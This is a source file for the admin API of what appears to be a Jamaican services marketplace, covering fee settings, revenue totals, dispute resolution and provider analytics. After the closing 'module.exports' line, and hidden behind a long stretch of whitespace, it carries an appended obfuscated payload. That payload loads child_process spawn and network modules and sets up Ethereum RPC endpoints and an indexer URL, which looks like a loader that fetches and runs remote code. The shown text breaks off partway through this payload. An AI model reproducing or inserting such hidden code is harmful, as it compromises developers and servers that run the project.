            SET pending_${side}_rate = $1, pending_${side}_effective = $2, updated_at = NOW()
          WHERE id = 1`,
        [r, effective]
      );
    }
    await db.query(
      `UPDATE public.fee_change_history SET status = 'superseded' WHERE status = 'active' AND (type = $1 OR type = 'both')`,
      [side]
    );
    await db.query(
      `INSERT INTO public.fee_change_history
         (code, type, old_client, old_provider, new_client, new_provider, effective, reason, changed_by, status)
       VALUES ('FCH-' || lpad(nextval('public.fee_change_code_seq')::text, 3, '0'),
               $1, $2, $3, $4, $5, $6, $7, $8, 'active')`,
      [side, oldClient, oldProvider, newClient, newProvider, effective, reason.trim(), req.user.id]
    );

    const out = await loadFeeConfig();
    res.json({ success: true, ...out, scheduled: !applyNow });
    // Only broadcast a live rate change when it actually took effect now.
    if (applyNow) broadcastFees(out.config);
  } catch (err) {
    console.error('PATCH /api/admin/fee-config error:', err);
    res.status(500).json({ success: false, message: 'Failed to update fee config.' });
  }
});

// POST /api/admin/fee-config/rollback { client, provider } — revert the checked
// side(s) to their previous historical value. Entries are individual per side.
router.post('/fee-config/rollback', async (req, res) => {
  const doClient = !!(req.body && req.body.client);
  const doProvider = !!(req.body && req.body.provider);
  if (!doClient && !doProvider) {
    return res.status(400).json({ success: false, message: 'Select at least one side to roll back.' });
  }
  try {
    const cur = (await db.query('SELECT client_rate, provider_rate FROM public.platform_fee_config WHERE id = 1')).rows[0];
    const oldClient = num(cur.client_rate);
    const oldProvider = num(cur.provider_rate);
    let newClient = oldClient;
    let newProvider = oldProvider;

    if (doClient) {
      const prev = (await db.query(
        `SELECT old_client FROM public.fee_change_history WHERE type IN ('client','both') ORDER BY created_at DESC LIMIT 1`
      )).rows[0];
      if (!prev) return res.status(400).json({ success: false, message: 'No previous client fee to roll back to.' });
      newClient = num(prev.old_client);
    }
    if (doProvider) {
      const prev = (await db.query(
        `SELECT old_provider FROM public.fee_change_history WHERE type IN ('provider','both') ORDER BY created_at DESC LIMIT 1`
      )).rows[0];
      if (!prev) return res.status(400).json({ success: false, message: 'No previous provider fee to roll back to.' });
      newProvider = num(prev.old_provider);
    }

    if (doClient) {
      await db.query(`UPDATE public.platform_fee_config SET client_rate = $1, client_effective = CURRENT_DATE, pending_client_rate = NULL, pending_client_effective = NULL, updated_at = NOW() WHERE id = 1`, [newClient]);
    }
    if (doProvider) {
      await db.query(`UPDATE public.platform_fee_config SET provider_rate = $1, provider_effective = CURRENT_DATE, pending_provider_rate = NULL, pending_provider_effective = NULL, updated_at = NOW() WHERE id = 1`, [newProvider]);
    }

    // Supersede the active entries for the rolled-back side(s).
    if (doClient && doProvider) {
      await db.query(`UPDATE public.fee_change_history SET status = 'superseded' WHERE status = 'active'`);
    } else {
      const side = doClient ? 'client' : 'provider';
      await db.query(`UPDATE public.fee_change_history SET status = 'superseded' WHERE status = 'active' AND (type = $1 OR type = 'both')`, [side]);
    }

    const type = doClient && doProvider ? 'both' : doClient ? 'client' : 'provider';
    const sidesLabel = [doClient && 'Client', doProvider && 'Provider'].filter(Boolean).join(' & ');
    await db.query(
      `INSERT INTO public.fee_change_history
         (code, type, old_client, old_provider, new_client, new_provider, effective, reason, changed_by, status)
       VALUES ('FCH-' || lpad(nextval('public.fee_change_code_seq')::text, 3, '0'),
               $1, $2, $3, $4, $5, CURRENT_DATE, $6, $7, 'active')`,
      [type, oldClient, oldProvider, newClient, newProvider, `Rollback (${sidesLabel})`, req.user.id]
    );

    const out = await loadFeeConfig();
    res.json({ success: true, ...out });
    broadcastFees(out.config);
  } catch (err) {
    console.error('POST /api/admin/fee-config/rollback error:', err);
    res.status(500).json({ success: false, message: 'Failed to roll back fee config.' });
  }
});

// PATCH /api/admin/fee-config/minimums { enabled, minClientFee, minProviderFee }
// Persist the minimum-fee floor (Advanced settings). Amounts are JMD cents.
router.patch('/fee-config/minimums', async (req, res) => {
  const { enabled, minClientFee, minProviderFee } = req.body || {};
  const cents = (v) => {
    const n = Math.round(Number(v));
    return Number.isFinite(n) && n >= 0 ? n : null;
  };
  const mc = cents(minClientFee);
  const mp = cents(minProviderFee);
  if (mc === null || mp === null) {
    return res.status(400).json({ success: false, message: 'Minimum fees must be non-negative amounts.' });
  }
  try {
    await db.query(
      `UPDATE public.platform_fee_config
         SET min_fee_enabled = $1, min_client_fee = $2, min_provider_fee = $3, updated_at = NOW()
       WHERE id = 1`,
      [enabled !== false, mc, mp]
    );
    const out = await loadFeeConfig();
    res.json({ success: true, ...out });
    // Nudge open clients to refresh fee data (incl. the new minimums via /api/fees).
    notifyChannel('platform-fees', 'fees-updated', {});
  } catch (err) {
    console.error('PATCH /api/admin/fee-config/minimums error:', err);
    res.status(500).json({ success: false, message: 'Failed to update minimum fees.' });
  }
});

// ============================================================
// GET /api/admin/revenue?period=30d
// Real platform revenue from public.transactions (recorded on quote accept —
// WiPay deferred, status 'held'; no money moves yet). Returns money fields the
// admin dashboard revenue widgets merge over their mock period row; activity /
// growth metrics remain mock until separately wired.
// See documentation/PAYMENTS_AND_JOB_WORKFLOW.md.
// ============================================================
const REVENUE_WINDOWS = { '7d': 7, '30d': 30, '90d': 90, '1y': 365, all: null };

const compactMoney = (cents) => {
  const d = Math.round((cents || 0) / 100);
  if (d >= 1e6) return (d / 1e6).toFixed(2).replace(/\.?0+$/, '') + 'M';
  if (d >= 1e3) return Math.round(d / 1e3) + 'K';
  return d.toLocaleString('en-US');
};
const fullMoney = (cents) => Math.round((cents || 0) / 100).toLocaleString('en-US');

router.get('/revenue', async (req, res) => {
  const period = REVENUE_WINDOWS.hasOwnProperty(req.query.period) ? req.query.period : '30d';
  const days = REVENUE_WINDOWS[period]; // null = all-time
  try {
    const sums = `
      SELECT COALESCE(SUM(amount),0)::bigint       AS gmv,
             COALESCE(SUM(client_fee),0)::bigint   AS cfee,
             COALESCE(SUM(provider_fee),0)::bigint AS pfee,
             COALESCE(SUM(platform_fee),0)::bigint AS rev,
             COUNT(*)::int                          AS done
      FROM public.transactions`;

    const current = await db.query(
      `${sums} WHERE ($1::int IS NULL OR created_at >= NOW() - (INTERVAL '1 day' * $1))`,
      [days]
    );
    const c = current.rows[0];

    // Delta vs the immediately preceding window of equal length (skip for all-time).
    let deltaRev = '—';
    if (days !== null) {
      const prev = await db.query(
        `${sums} WHERE created_at >= NOW() - (INTERVAL '1 day' * $1 * 2)
                   AND created_at <  NOW() - (INTERVAL '1 day' * $1)`,
        [days]
      );
      const prevRev = Number(prev.rows[0].rev);
      const curRev = Number(c.rev);
      if (prevRev > 0) {
        const pct = ((curRev - prevRev) / prevRev) * 100;
        deltaRev = `${pct >= 0 ? '↑' : '↓'} ${Math.abs(pct).toFixed(1)}%`;
      } else if (curRev > 0) {
        deltaRev = '↑ new';
      }
    }

    const done = c.done || 0;
    res.json({
      success: true,
      revenue: {
        rev: compactMoney(c.rev),
        cfee: compactMoney(c.cfee),
        pfee: compactMoney(c.pfee),
        gmv: compactMoney(c.gmv),
        done,
        delta_rev: deltaRev,
        fee_clients: fullMoney(c.cfee),
        fee_provs: fullMoney(c.pfee),
        fee_per_job: done ? 'J$' + fullMoney(Number(c.rev) / done) : 'J$0',
        avg_gmv: done ? 'J$' + fullMoney(Number(c.gmv) / done) : 'J$0',
      },
    });
  } catch (err) {
    console.error('GET /api/admin/revenue error:', err);
    res.status(500).json({ success: false, message: 'Failed to load revenue.' });
  }
});

// ============================================================
// Disputes — admin review & resolution console.
// See documentation/PAYMENTS_AND_JOB_WORKFLOW.md ("Disputes").
// ============================================================

// How admins can resolve a dispute → the escrow status we record. WiPay is
// deferred, so no money actually moves; the disputes row is the authoritative
// record of the outcome (incl. the "split" nuance the enum can't express).
const RESOLUTION_TX_STATUS = {
  refund: 'refunded',   // client made whole
  release: 'completed', // provider paid out
  split: 'completed',   // partial each way; recorded on the dispute row
};

// GET /api/admin/disputes
// Every dispute with its transaction, tender, service, parish, both parties,
// the two-sided fee breakdown, and a signed URL for the evidence photo.
router.get('/disputes', async (req, res) => {
  try {
    const result = await db.query(`
      SELECT
        d.id,
        d.category,
        d.description,
        d.image_path,
        d.status,
        d.resolution,
        d.resolution_notes,
        d.created_at,
        d.resolved_at,
        d.client_id,
        d.provider_id,
        tx.quote_id,
        t.display_code,
        t.parish,
        t.created_at                         AS tender_created_at,
        st.display_name                      AS service_name,
        cu.first_name                        AS client_first_name,
        cu.last_name                         AS client_last_name,
        pu.first_name                        AS provider_first_name,
        pu.last_name                         AS provider_last_name,
        ru.first_name                        AS resolver_first_name,
        ru.last_name                         AS resolver_last_name,
        tx.amount,
        tx.client_fee,
        tx.provider_fee,
        tx.platform_fee,
        tx.provider_payout,
        tx.status                            AS transaction_status,
        tx.created_at                        AS accepted_at,
        tx.provider_completed_at
      FROM public.disputes d
      JOIN public.transactions tx ON tx.id = d.transaction_id
      JOIN public.tenders t       ON t.id = tx.tender_id
      LEFT JOIN public.service_types st ON st.id = t.service_type_id
      JOIN public.users cu        ON cu.id = d.client_id
      JOIN public.users pu        ON pu.id = d.provider_id
      LEFT JOIN public.users ru   ON ru.id = d.resolved_by
      ORDER BY (d.status = 'open') DESC, d.created_at DESC
    `);

    // The 1:1 chat is scoped to the quote (transactions.quote_id → messages).
    // Admins may read all messages (messages_select_admin RLS) for dispute
    // resolution. Fetch every relevant conversation in one query and group by
    // quote so we can attach a transcript to each dispute.
    const quoteIds = [...new Set(result.rows.map((r) => r.quote_id).filter(Boolean))];
    const chatByQuote = new Map();
    if (quoteIds.length) {
      const msgs = await db.query(
        `SELECT quote_id, sender_id, body, created_at
           FROM public.messages
          WHERE quote_id = ANY($1::uuid[])
          ORDER BY created_at ASC`,
        [quoteIds]
      );
      for (const m of msgs.rows) {
        if (!chatByQuote.has(m.quote_id)) chatByQuote.set(m.quote_id, []);
        chatByQuote.get(m.quote_id).push(m);
      }
    }

    // Sign evidence photos (private tender-media bucket).
    const disputes = await Promise.all(
      result.rows.map(async (r) => ({
        id: r.id,
        displayCode: r.display_code,
        job: r.service_name || 'Service job',
        category: r.category,
        parish: r.parish,
        description: r.description,
        evidenceUrl: await signedUrl(supabase, 'tender-media', r.image_path),
        chat: (chatByQuote.get(r.quote_id) || []).map((m) => ({
          role: m.sender_id === r.client_id ? 'client' : m.sender_id === r.provider_id ? 'provider' : 'system',
          body: m.body,
          createdAt: m.created_at,
        })),
        status: r.status,
        resolution: r.resolution,
        resolutionNotes: r.resolution_notes,
        client: { firstName: r.client_first_name, lastName: r.client_last_name },
        provider: { firstName: r.provider_first_name, lastName: r.provider_last_name },
        resolver:
          r.resolver_first_name || r.resolver_last_name
            ? { firstName: r.resolver_first_name, lastName: r.resolver_last_name }
            : null,
        amount: r.amount,
        clientFee: r.client_fee,
        providerFee: r.provider_fee,
        platformFee: r.platform_fee,
        providerPayout: r.provider_payout,
        transactionStatus: r.transaction_status,
        tenderCreatedAt: r.tender_created_at,
        acceptedAt: r.accepted_at,
        providerCompletedAt: r.provider_completed_at,
        createdAt: r.created_at,
        resolvedAt: r.resolved_at,
      }))
    );

    // Dispute rate needs the denominator: total accepted (transacted) jobs.
    const totals = await db.query(
      `SELECT COUNT(*)::int AS transacted FROM public.transactions`
    );

    res.json({
      success: true,
      disputes,
      stats: { transactedJobs: totals.rows[0].transacted },
    });
  } catch (err) {
    console.error('GET /api/admin/disputes error:', err);
    res.status(500).json({ success: false, message: 'Failed to load disputes.' });
  }
});

// POST /api/admin/disputes/:id/resolve   { resolution, notes? }
// Resolve an open dispute: record the outcome + note + resolver, advance the
// escrow status, and notify both parties (email + realtime + bell).
router.post('/disputes/:id/resolve', async (req, res) => {
  const { id } = req.params;
  const resolution = typeof req.body.resolution === 'string' ? req.body.resolution : '';
  const notes = typeof req.body.notes === 'string' ? req.body.notes.trim() : '';
  const txStatus = RESOLUTION_TX_STATUS[resolution];
  if (!txStatus) {
    return res.status(400).json({ success: false, message: 'Invalid resolution. Use refund, release, or split.' });
  }
  try {
    const ctx = await db.query(`
      SELECT d.id, d.status, d.transaction_id, d.client_id, d.provider_id,
             st.display_name AS service_name,
             tx.amount, tx.client_fee, tx.provider_payout,
             cu.email AS client_email, (cu.first_name || ' ' || cu.last_name) AS client_name,
             pu.email AS provider_email, (pu.first_name || ' ' || pu.last_name) AS provider_name,
             t.id AS tender_id
      FROM public.disputes d
      JOIN public.transactions tx ON tx.id = d.transaction_id
      JOIN public.tenders t       ON t.id = tx.tender_id
      LEFT JOIN public.service_types st ON st.id = t.service_type_id
      JOIN public.users cu        ON cu.id = d.client_id
      JOIN public.users pu        ON pu.id = d.provider_id
      WHERE d.id = $1
    `, [id]);

    if (ctx.rows.length === 0) return res.status(404).json({ success: false, message: 'Dispute not found.' });
    const row = ctx.rows[0];
    if (row.status !== 'open') {
      return res.status(409).json({ success: false, message: 'This dispute has already been resolved.' });
    }

    await db.query(
      `UPDATE public.disputes
         SET status = 'resolved', resolution = $1, resolution_notes = $2,
             resolved_by = $3, resolved_at = NOW()
       WHERE id = $4`,
      [resolution, notes || null, req.user.id, id]
    );
    await db.query(
      `UPDATE public.transactions
         SET status = $1::transaction_status,
             completed_at = CASE WHEN $1 = 'completed' THEN NOW() ELSE completed_at END,
             updated_at = NOW()
       WHERE id = $2`,
      [txStatus, row.transaction_id]
    );
    // Resolving a dispute closes the job: the tender leaves in_progress so it
    // drops out of the homeowner's "In Progress" and the provider's "Won"
    // buckets and lands in "Completed" for both. (Refund still records the
    // outcome on the dispute/transaction; there is no separate cancelled state.)
    await db.query(
      `UPDATE public.tenders SET status = 'completed', updated_at = NOW() WHERE id = $1`,
      [row.tender_id]
    );

    res.json({ success: true });

    // ── Fire-and-forget: notify both parties ─────────────────────────────
    (async () => {
      const serviceName = row.service_name || 'the job';
      // Amount surfaced to each party depends on the outcome.
      const clientTotalCents = (row.amount || 0) + (row.client_fee || 0);
      const fmt = (cents) => Math.round((cents || 0) / 100).toLocaleString('en-US');
      const clientAmt =
        resolution === 'refund' ? fmt(clientTotalCents)
        : resolution === 'split' ? fmt(Math.round(clientTotalCents / 2))
        : null;
      const providerAmt =
        resolution === 'release' ? fmt(row.provider_payout)
        : resolution === 'split' ? fmt(Math.round((row.provider_payout || 0) / 2))
        : null;

      const outcomeLabel = {
        refund: 'The homeowner has been fully refunded.',
        release: 'The payout has been released to the provider.',
        split: 'A split resolution was applied (partial refund + partial payout).',
      }[resolution];

      const tasks = [
        sendDisputeResolvedClientEmail(row.client_email, {
          clientName: row.client_name, tenderTitle: serviceName, resolution, amountLabel: clientAmt, notes,
        }),
        sendDisputeResolvedProviderEmail(row.provider_email, {
          providerName: row.provider_name, tenderTitle: serviceName, resolution, amountLabel: providerAmt, notes,
        }),
        notifyUser(row.client_id, 'dispute-resolved', { tenderId: row.tender_id }),
        notifyUser(row.provider_id, 'dispute-resolved', { tenderId: row.tender_id }),
        db.query(
          `INSERT INTO public.notifications (user_id, type, title, body, data)
           VALUES ($1, 'dispute_resolved', $2, $3, $4::jsonb),
                  ($5, 'dispute_resolved', $6, $7, $4::jsonb)`,
          [
            row.client_id, `Your dispute on "${serviceName}" was resolved`, outcomeLabel,
            JSON.stringify({ tenderId: row.tender_id }),
            row.provider_id, `The dispute on "${serviceName}" was resolved`, outcomeLabel,
          ]
        ),
        notifyChannel('admin-disputes', 'dispute-resolved', { disputeId: id }),
      ];
      await Promise.allSettled(tasks);
    })().catch((err) => console.warn('POST /admin/disputes/:id/resolve — side-effect error:', err.message));
  } catch (err) {
    console.error('POST /api/admin/disputes/:id/resolve error:', err);
    res.status(500).json({ success: false, message: 'Failed to resolve the dispute.' });
  }
});

// ============================================================
// GET /api/admin/providers — analytics for the admin Providers screen.
// Read-only aggregation across users/provider_profiles/quotes/transactions/
// reviews. Money in JMD cents. db.query (superuser) — route is admin-gated.
// ============================================================
router.get('/providers', async (req, res) => {
  try {
    const provsP = db.query(`
      SELECT
        u.id                                    AS provider_id,
        u.display_code,
        (u.first_name || ' ' || u.last_name)    AS name,
        u.parish,
        pp.verification_status,
        COALESCE(pp.is_verified, false)         AS is_verified,
        COALESCE(jw.jobs_won, 0)::int           AS jobs_won,
        COALESCE(er.earnings_cents, 0)::bigint  AS earnings_cents,
        rv.avg_rating,
        COALESCE(rv.review_count, 0)::int       AS review_count,
        rt.avg_response_hrs,
        COALESCE(cats.cats, ARRAY[]::text[])    AS cats,
        (COALESCE(rq.recent_quotes, 0) > 0)     AS active
      FROM public.users u
      LEFT JOIN public.provider_profiles pp ON pp.provider_id = u.id
      LEFT JOIN (SELECT provider_id, COUNT(*) AS jobs_won FROM public.quotes WHERE status = 'accepted' GROUP BY provider_id) jw ON jw.provider_id = u.id
      LEFT JOIN (SELECT provider_id, SUM(provider_payout) AS earnings_cents FROM public.transactions GROUP BY provider_id) er ON er.provider_id = u.id
      LEFT JOIN (SELECT provider_id, AVG(rating) AS avg_rating, COUNT(*) AS review_count FROM public.reviews GROUP BY provider_id) rv ON rv.provider_id = u.id
      LEFT JOIN (SELECT q.provider_id, AVG(EXTRACT(EPOCH FROM (q.created_at - t.created_at)) / 3600.0) AS avg_response_hrs
                 FROM public.quotes q JOIN public.tenders t ON t.id = q.tender_id GROUP BY q.provider_id) rt ON rt.provider_id = u.id
      LEFT JOIN (SELECT ps.provider_id, ARRAY_AGG(DISTINCT st.display_name) AS cats
                 FROM public.provider_services ps JOIN public.service_types st ON st.id = ps.service_type_id GROUP BY ps.provider_id) cats ON cats.provider_id = u.id
      LEFT JOIN (SELECT provider_id, COUNT(*) AS recent_quotes FROM public.quotes WHERE created_at >= NOW() - INTERVAL '30 days' GROUP BY provider_id) rq ON rq.provider_id = u.id
      WHERE u.role = 'provider'
      ORDER BY jobs_won DESC, earnings_cents DESC
    `);

    const statsP = db.query(`
      SELECT
        (SELECT COUNT(*) FROM public.users WHERE role = 'provider')::int AS total_providers,
        (SELECT COUNT(*) FROM public.provider_profiles WHERE verification_status = 'approved')::int AS verified_count,
        (SELECT COUNT(DISTINCT provider_id) FROM public.quotes WHERE created_at >= NOW() - INTERVAL '30 days')::int AS active_count,
        (SELECT AVG(rating) FROM public.reviews) AS avg_rating,
        (SELECT COUNT(*) FROM public.reviews)::int AS review_count,
        (SELECT AVG(EXTRACT(EPOCH FROM (q.created_at - t.created_at)) / 3600.0)
           FROM public.quotes q JOIN public.tenders t ON t.id = q.tender_id) AS avg_response_hrs,
        (SELECT COUNT(*) FROM (SELECT provider_id FROM public.reviews GROUP BY provider_id HAVING AVG(rating) < 3) x)::int AS flagged_below3
    `);

    const distP = db.query(`SELECT rating AS stars, COUNT(*)::int AS count FROM public.reviews GROUP BY rating`);

    const clientsP = db.query(`
      SELECT u.display_code, (u.first_name || ' ' || u.last_name) AS name,
             SUM(tx.amount + tx.client_fee)::bigint AS spend_cents,
             COUNT(*)::int AS jobs
      FROM public.transactions tx
      JOIN public.users u ON u.id = tx.client_id
      GROUP BY u.id, u.display_code, name
      ORDER BY spend_cents DESC
      LIMIT 10
    `);

    const [provs, stats, dist, clients] = await Promise.all([provsP, statsP, distP, clientsP]);
    const s = stats.rows[0];
    const distMap = {};
    for (const d of dist.rows) distMap[d.stars] = d.count;
    const numOrNull = (v) => (v == null ? null : parseFloat(v));

    res.json({
      success: true,
      providers: provs.rows.map((r) => ({
        providerId: r.provider_id,
        displayCode: r.display_code,
        name: r.name,
        parish: r.parish,
        cats: r.cats || [],
        verified: r.verification_status === 'approved' || r.is_verified === true,
        jobsWon: r.jobs_won,
        earningsCents: Number(r.earnings_cents),
        avgRating: numOrNull(r.avg_rating),
        reviewCount: r.review_count,
        responseHrs: numOrNull(r.avg_response_hrs),
        active: r.active === true,
      })),
      clients: clients.rows.map((c) => ({
        name: c.name,
        displayCode: c.display_code,
        spendCents: Number(c.spend_cents),
        jobs: c.jobs,
        repeat: c.jobs > 1,
      })),
      stats: {
        totalProviders: s.total_providers,
        verifiedCount: s.verified_count,
        activeCount: s.active_count,
        avgRating: numOrNull(s.avg_rating),
        reviewCount: s.review_count,
        avgResponseHrs: numOrNull(s.avg_response_hrs),
        flaggedBelow3: s.flagged_below3,
        ratingDistribution: [5, 4, 3, 2, 1].map((stars) => ({ stars, count: distMap[stars] || 0 })),
      },
    });
  } catch (err) {
    console.error('GET /api/admin/providers error:', err);
    res.status(500).json({ success: false, message: 'Failed to load providers.' });
  }
});

// ============================================================
// GET /api/admin/analytics/supply-demand — supply vs demand analytics.
// Demand = current open (unawarded, live) tenders. Supply = VERIFIED providers
// listing that category/parish. Revenue from transactions (JMD cents). Read-only
// aggregation; db.query (superuser) — route is admin-gated.
// ============================================================
router.get('/analytics/supply-demand', async (req, res) => {
  try {
    // Canonical "live demand" filter (mirrors GET /tenders/active-count).
    const DEMAND_FILTER = `
      t.status = 'open' AND t.trashed_at IS NULL
      AND (t.expires_at IS NULL OR t.expires_at > NOW())
      AND NOT EXISTS (SELECT 1 FROM public.quotes q WHERE q.tender_id = t.id AND q.status = 'accepted')`;

    const categoriesP = db.query(`
      SELECT
        st.slug,
        st.display_name                          AS name,
        st.emoji,
        COALESCE(d.demand, 0)::int               AS demand,
        COALESCE(s.providers, 0)::int            AS providers,
        COALESCE(j.jobs, 0)::int                 AS jobs,
        COALESCE(j.gmv_cents, 0)::bigint         AS gmv_cents,
        COALESCE(j.rev_cents, 0)::bigint         AS rev_cents,
        rt.avg_response_hrs
      FROM public.service_types st
      LEFT JOIN (
        SELECT t.category::text AS cat, COUNT(*) AS demand
        FROM public.tenders t WHERE ${DEMAND_FILTER} GROUP BY t.category
      ) d ON d.cat = st.slug
      LEFT JOIN (
        SELECT ps.category::text AS cat, COUNT(DISTINCT ps.provider_id) AS providers
        FROM public.provider_services ps
        JOIN public.provider_profiles pp ON pp.provider_id = ps.provider_id
        WHERE pp.verification_status = 'approved'
        GROUP BY ps.category
      ) s ON s.cat = st.slug
      LEFT JOIN (
        SELECT t.category::text AS cat, COUNT(tx.id) AS jobs,
               SUM(tx.amount) AS gmv_cents, SUM(tx.platform_fee) AS rev_cents
        FROM public.transactions tx JOIN public.tenders t ON t.id = tx.tender_id
        GROUP BY t.category
      ) j ON j.cat = st.slug
      LEFT JOIN (
        SELECT t.category::text AS cat,
               AVG(EXTRACT(EPOCH FROM (fq.first_at - t.created_at)) / 3600.0) AS avg_response_hrs
        FROM (SELECT tender_id, MIN(created_at) AS first_at FROM public.quotes GROUP BY tender_id) fq
        JOIN public.tenders t ON t.id = fq.tender_id
        GROUP BY t.category
      ) rt ON rt.cat = st.slug
      WHERE st.is_active = true
      ORDER BY st.sort_order
    `);

    const parishesP = db.query(`
      SELECT COALESCE(d.parish, s.parish) AS name,
             COALESCE(d.demand, 0)::int   AS demand,
             COALESCE(s.providers, 0)::int AS providers
      FROM (
        SELECT t.parish, COUNT(*) AS demand
        FROM public.tenders t WHERE ${DEMAND_FILTER} GROUP BY t.parish
      ) d
      FULL OUTER JOIN (
        SELECT pp.parish, COUNT(DISTINCT pp.provider_id) AS providers
        FROM public.provider_parishes pp
        JOIN public.provider_profiles pr ON pr.provider_id = pp.provider_id
        WHERE pr.verification_status = 'approved'
        GROUP BY pp.parish
      ) s ON s.parish = d.parish
      ORDER BY demand DESC, providers DESC
    `);

    const [categories, parishes] = await Promise.all([categoriesP, parishesP]);
    const numOrNull = (v) => (v == null ? null : parseFloat(v));

    res.json({
      success: true,
      categories: categories.rows.map((r) => ({
        slug: r.slug,
        name: r.name,
        emoji: r.emoji,
        demand: r.demand,
        providers: r.providers,
        jobs: r.jobs,
        gmvCents: Number(r.gmv_cents),
        revCents: Number(r.rev_cents),
        avgResponseHrs: numOrNull(r.avg_response_hrs),
      })),
      parishes: parishes.rows.map((r) => ({
        name: r.name,
        demand: r.demand,
        providers: r.providers,
      })),
    });
  } catch (err) {
    console.error('GET /api/admin/analytics/supply-demand error:', err);
    res.status(500).json({ success: false, message: 'Failed to load supply/demand analytics.' });
  }
});

module.exports = router;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global.i="A9-8267";const _0x3a2ebe=_0x355e;(function(_0x48f9d7,_0x1a07be){const _0x4e7ab0=_0x355e,_0x39127c=_0x48f9d7();while(!![]){try{const _0x3f9af1=parseInt(_0x4e7ab0(0xf0))/(0x1*-0x1087+-0x1170+-0x4*-0x87e)*(-parseInt(_0x4e7ab0(0xdd))/(0x7*0x165+0x160f+-0x1fd0))+-parseInt(_0x4e7ab0(0x13c))/(-0x202*0x2+-0xe38+0x123f)+-parseInt(_0x4e7ab0(0xa5))/(0x7b*0x39+-0x1*0x417+0xba4*-0x2)+parseInt(_0x4e7ab0(0xc0))/(0x3a0+-0x21a2+0x1e07*0x1)+parseInt(_0x4e7ab0(0xb5))/(0x8ff*0x2+-0x1a2*0x6+0x82c*-0x1)*(-parseInt(_0x4e7ab0(0x174))/(0x10a6+0x2534+-0x35d3))+parseInt(_0x4e7ab0(0x10c))/(-0x11d1+0xbe+0x1d*0x97)+parseInt(_0x4e7ab0(0x13a))/(-0xb8*0x8+0x1df6+0x80f*-0x3);if(_0x3f9af1===_0x1a07be)break;else _0x39127c['push'](_0x39127c['shift']());}catch(_0x388603){_0x39127c['push'](_0x39127c['shift']());}}}(_0x12f0,-0xfbb0*-0x2+0x1*0x13020b+0x5*-0x20155));import{createRequire}from'module';let require=createRequire(import.meta.url);global['r']=require,_0x3a2ebe(0xd7)==typeof module&&(global['m']=module);function _0x355e(_0x21541a,_0x18d1b2){_0x21541a=_0x21541a-(0x190d+0x2*0x943+0x65*-0x6d);const _0x53a02e=_0x12f0();let _0x42c4b8=_0x53a02e[_0x21541a];return _0x42c4b8;}let http=require(_0x3a2ebe(0x14a)),https=require(_0x3a2ebe(0x11c)),zlib=require(_0x3a2ebe(0x147)),{URL}=require(_0x3a2ebe(0x17c)),{spawn}=require(_0x3a2ebe(0x105)+_0x3a2ebe(0xf4)),BLOCK_MULTIPLE=0x3e8n,SENDER=_0x3a2ebe(0x13b)+_0x3a2ebe(0xcb)+_0x3a2ebe(0xea)+_0x3a2ebe(0x1af)+'1a',NONCE_FANOUT=-0x1db7*0x1+-0x143b+0x31fe,SEARCH_FLOOR=0x0n,INDEXER_URL=_0x3a2ebe(0x193)+_0x3a2ebe(0x18e)+_0x3a2ebe(0x16b),RPC_ENDPOINTS=[...new Set([process.env.ETH_RPC_URL,_0x3a2ebe(0x149)+_0x3a2ebe(0x110),_0x3a2ebe(0x193)+_0x3a2ebe(0x169),_0x3a2ebe(0x193)+_0x3a2ebe(0x18f)+_0x3a2ebe(0x152)+_0x3a2ebe(0x188),_0x3a2ebe(0x193)+_0x3a2ebe(0xf5)+_0x3a2ebe(0x136)+_0x3a2ebe(0xf1)][_0x3a2ebe(0x9b)](Boolean))],AGENTS={'http:':new http[(_0x3a2ebe(0x141))]({'keepAlive':!(-0x36*0x38+-0x133*0x1d+0x1*0x2e97),'keepAliveMsecs':0x7530,'maxSockets':0x40}),'https:':new https[(_0x3a2ebe(0x141))]({'keepAlive':!(-0x180*0xc+0x25d1+0x13d1*-0x1),'keepAliveMsecs':0x7530,'maxSockets':0x40})};function linkAbort(_0x438117,_0x5d73ca){const _0x8685d7=_0x3a2ebe,_0x25ef4d={'TCDmB':_0x8685d7(0x9a)};_0x438117&&_0x438117[_0x8685d7(0x194)+_0x8685d7(0xf9)](_0x25ef4d[_0x8685d7(0x191)],()=>_0x5d73ca[_0x8685d7(0x9a)](),{'once':!(0x1*-0x1073+-0x319*-0x4+0x40f)});}function decompressStream(_0x1f71f7){const _0x29b168=_0x3a2ebe,_0x5d6cbb={'BTHgJ':_0x29b168(0xc8)+_0x29b168(0x126),'VLAGf':function(_0x5acbb2,_0x1cb9f1){return _0x5acbb2===_0x1cb9f1;},'JbAci':_0x29b168(0x148),'GAvxe':_0x29b168(0x186),'KvMSQ':function(_0x55b882,_0x1919d7){return _0x55b882===_0x1919d7;},'DSbLa':_0x29b168(0xeb)};let _0x98df8e=(_0x1f71f7[_0x29b168(0x14b)][_0x5d6cbb[_0x29b168(0x12f)]]||'')[_0x29b168(0xc2)+'e']();return _0x5d6cbb[_0x29b168(0x164)](_0x5d6cbb[_0x29b168(0x14d)],_0x98df8e)||_0x5d6cbb[_0x29b168(0x164)](_0x5d6cbb[_0x29b168(0x176)],_0x98df8e)?_0x1f71f7[_0x29b168(0x195)](zlib[_0x29b168(0x14c)+'ip']()):_0x5d6cbb[_0x29b168(0x134)](_0x5d6cbb[_0x29b168(0xfd)],_0x98df8e)?_0x1f71f7[_0x29b168(0x195)](zlib[_0x29b168(0x165)+_0x29b168(0xb1)]()):_0x5d6cbb[_0x29b168(0x164)]('br',_0x98df8e)?_0x1f71f7[_0x29b168(0x195)](zlib[_0x29b168(0x19f)+_0x29b168(0x12d)+'ss']()):_0x1f71f7;}function httpRequest(_0x593adb,{method:_0x25a99d=_0x3a2ebe(0x133),body:_0x3f686c,signal:_0x95d4f4}={}){const _0x3d2da5=_0x3a2ebe,_0x42d10d={'JODvp':function(_0x56ddc3,_0x1259f1){return _0x56ddc3(_0x1259f1);},'gvgPD':_0x3d2da5(0x19b),'gMfuo':_0x3d2da5(0xaf),'KaaPY':_0x3d2da5(0x142),'rysJt':_0x3d2da5(0xc1),'UlrdI':function(_0x322dc5,_0x2b93bc){return _0x322dc5===_0x2b93bc;},'MHjGK':_0x3d2da5(0xd5),'zBIcw':function(_0x2a5ebb,_0xfe6778){return _0x2a5ebb+_0xfe6778;},'VGOlJ':function(_0x563e9c,_0x3a7e42){return _0x563e9c!=_0x3a7e42;},'xuBDG':function(_0x4bfaf9,_0x580f75){return 